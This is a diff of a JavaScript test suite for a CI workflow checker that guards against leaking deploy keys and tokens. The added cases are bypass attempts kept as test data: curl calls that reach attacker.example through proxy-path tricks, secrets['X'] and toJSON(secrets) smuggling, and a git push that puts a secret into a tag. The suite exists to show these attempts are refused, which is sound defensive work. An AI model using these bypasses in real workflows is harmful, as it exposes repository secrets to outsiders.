@@ -132,7 +132,7 @@ describe("a credential leaves no job through curl or a file (round 5, HIGH)", ()
         inject(w, P, "publish-go", {
           run: 'curl -fsS "https://proxy.golang.org/${UNIT_VERSION}/x/@v/list"',
         }),
-      /literal up to \/@v\//,
+      /curl reaches only .*, exactly/,
     ],
     [
       "go: another module on the proxy",
@@ -140,7 +140,7 @@ describe("a credential leaves no job through curl or a file (round 5, HIGH)", ()
         inject(w, P, "publish-go", {
           run: 'curl -fsS "https://proxy.golang.org/attacker.example/x/@v/list"',
         }),
-      /literal up to \/@v\//,
+      /curl reaches only .*, exactly/,
     ],
     [
       "npm: curl outside the Go job",
@@ -550,6 +550,233 @@ describe("the reviewers' round-4 driver cases, against the real workflows", () =
     const got = added(mutate);
     expect(
       got.some((g) => g.includes(`: ${job}`)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
+  });
+});
+
+describe("round 5's bypasses: a credential reaches no unpinned name, no test and no proxy path", () => {
+  const PFX = "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/";
+  const SECRET = "GO_TAG_DEPLOY_KEY";
+  const at =
+    (job, s, i = 1) =>
+    (w) =>
+      w[P].jobs[job].steps.splice(i, 0, { name: "injected", ...s });
+  const pre = (job, stepName, line) => (w) => {
+    const s = w[P].jobs[job].steps.find((x) => x.name === stepName);
+    s.run = `${line}\n${s.run}`;
+  };
+  const INDEX = /an index \(\[…\]\) into a context/;
+  const FN = /toJSON, fromJSON, format and join are refused/;
+  const PIN = /not its pinned expression/;
+  const TEST = /credential DEPLOY_KEY outside its recorded position/;
+  const CURL = /curl reaches only .*, exactly/;
+  it.each([
+    [
+      "E1 [ -n K -a -n K ]",
+      pre(
+        "publish-go",
+        "Install the deploy key",
+        '[ -n "$DEPLOY_KEY" -a -n "$DEPLOY_KEY" ] && echo y',
+      ),
+      TEST,
+    ],
+    [
+      "E2 [ -n K = abc ]",
+      pre("publish-go", "Install the deploy key", 'if [ -n "$DEPLOY_KEY" = abc ]; then echo y; fi'),
+      TEST,
+    ],
+    [
+      "E3 [ abc \\< -n -o -n K ]",
+      pre(
+        "publish-go",
+        "Install the deploy key",
+        'if [ abc \\< -n -o -n "$DEPLOY_KEY" ]; then echo y; fi',
+      ),
+      /backslash outside quotes|credential DEPLOY_KEY/,
+    ],
+    ["E4 [ K ]", pre("publish-go", "Install the deploy key", '[ "$DEPLOY_KEY" ] && echo y'), TEST],
+    [
+      "L10 [ -n K -a … ] in Upload",
+      pre("publish-go", "Upload", '[ -n "${DEPLOY_KEY}" -a -n "${DEPLOY_KEY}" ] && echo y'),
+      /credential DEPLOY_KEY outside|undefined|no env/,
+    ],
+    [
+      "L1 secrets['X'] in an allowed name",
+      at("publish-go", {
+        env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      INDEX,
+    ],
+    [
+      "L2 toJSON(secrets)",
+      at("publish-go", {
+        env: { DOTNET_NOLOGO: "${{ toJSON(secrets) }}" },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      FN,
+    ],
+    [
+      "L3 github['token']",
+      at("publish-go", {
+        env: { DOTNET_NOLOGO: "${{ github['token'] }}" },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      INDEX,
+    ],
+    [
+      "L3b toJSON(github)",
+      at("publish-go", {
+        env: { DOTNET_NOLOGO: "${{ toJSON(github) }}" },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      FN,
+    ],
+    [
+      "L8 format('{0}', secrets.X)",
+      at("publish-go", {
+        env: { CLOUDFLARE_ACCOUNT_ID: `\${{ format('{0}', secrets.${SECRET}) }}` },
+        run: 'echo "${CLOUDFLARE_ACCOUNT_ID}"',
+      }),
+      FN,
+    ],
+    [
+      "L9 a job env bracket",
+      (w) => {
+        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = `\${{ secrets['${SECRET}'] }}`;
+      },
+      INDEX,
+    ],
+    [
+      "M1 toJSON(secrets) as R2_ACCESS_KEY_ID",
+      (w) => {
+        w[P].jobs["publish-go"].env.R2_ACCESS_KEY_ID = "${{ toJSON(secrets) }}";
+      },
+      FN,
+    ],
+    [
+      "M2 github['token'] as CLOUDFLARE_ACCOUNT_ID",
+      at("publish-go", { env: { CLOUDFLARE_ACCOUNT_ID: "${{ github['token'] }}" }, run: "echo x" }),
+      INDEX,
+    ],
+    [
+      "M3 secrets[X] in packagist",
+      at("publish-packagist", {
+        env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      INDEX,
+    ],
+    [
+      "M4 steps['x'].outputs",
+      at("publish-go", {
+        env: { DOTNET_NOLOGO: "${{ steps['inj'].outputs.y }}" },
+        run: 'echo "${DOTNET_NOLOGO}"',
+      }),
+      INDEX,
+    ],
+    [
+      "M5 env['DEPLOY_KEY'] at job",
+      (w) => {
+        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ env['DEPLOY_KEY'] }}";
+      },
+      INDEX,
+    ],
+    [
+      "Q1 fromJSON(toJSON(secrets)).X into a tag",
+      at(
+        "publish-go",
+        {
+          env: { CLOUDFLARE_ACCOUNT_ID: "${{ fromJSON(toJSON(secrets)).SOME_ORG_SECRET }}" },
+          run: 'git push --atomic --end-of-options git@github.com:confeature/sdks.git "HEAD:refs/tags/${CLOUDFLARE_ACCOUNT_ID}"',
+        },
+        3,
+      ),
+      FN,
+    ],
+    [
+      "Q3 github['token'] in the Upload job's env",
+      (w) => {
+        w[P].jobs["publish-go"].env.CLOUDFLARE_ACCOUNT_ID = "${{ github['token'] }}";
+      },
+      INDEX,
+    ],
+    [
+      "Q4 packagist Upload: fromJSON(toJSON(secrets)).X",
+      (w) => {
+        w[P].jobs["publish-packagist"].steps.find(
+          (s) => s.name === "Upload",
+        ).env.CLOUDFLARE_ACCOUNT_ID = "${{ fromJSON(toJSON(secrets)).X }}";
+      },
+      FN,
+    ],
+    [
+      "R1 needs['x'] (rule 16)",
+      (w) => {
+        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ needs['nosuchjob'].outputs.nothing }}";
+      },
+      INDEX,
+    ],
+    [
+      "a literal value for an allowed name",
+      (w) => {
+        w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "0";
+      },
+      PIN,
+    ],
+    [
+      "a secret in a name pinned to a literal",
+      (w) => {
+        w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "${{ secrets.MIRROR_DEPLOY_KEY }}";
+      },
+      PIN,
+    ],
+    [
+      "another pack job's artifact name",
+      (w) => {
+        w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-pypi.outputs.file }}";
+      },
+      PIN,
+    ],
+    [
+      "a bare context",
+      (w) => {
+        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ secrets }}";
+      },
+      /the bare secrets context/,
+    ],
+    [
+      "L4 ../ out of the module",
+      at("publish-go", {
+        run: `curl -fsS --proto =https "${PFX}../../../../../../attacker.example/x/@v/list"`,
+      }),
+      CURL,
+    ],
+    [
+      "L4c a query",
+      at("publish-go", { run: `curl -fsS --proto =https "${PFX}v1.info?x=1"` }),
+      CURL,
+    ],
+    [
+      "L4d %2e",
+      at("publish-go", { run: `curl -fsS --proto =https "${PFX}%2e%2e/%2e%2e/x"` }),
+      CURL,
+    ],
+    [
+      "L4e @ userinfo",
+      at("publish-go", { run: `curl -fsS --proto =https "${PFX}@attacker.example/"` }),
+      CURL,
+    ],
+    [
+      "the module's list, not its version",
+      at("publish-go", { run: `curl -fsS --proto =https "${PFX}list"` }),
+      CURL,
+    ],
+  ])("refuses %s", (_, mutate, why) => {
+    const got = added(mutate);
+    expect(
+      got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
     ).toBe(true);
   });
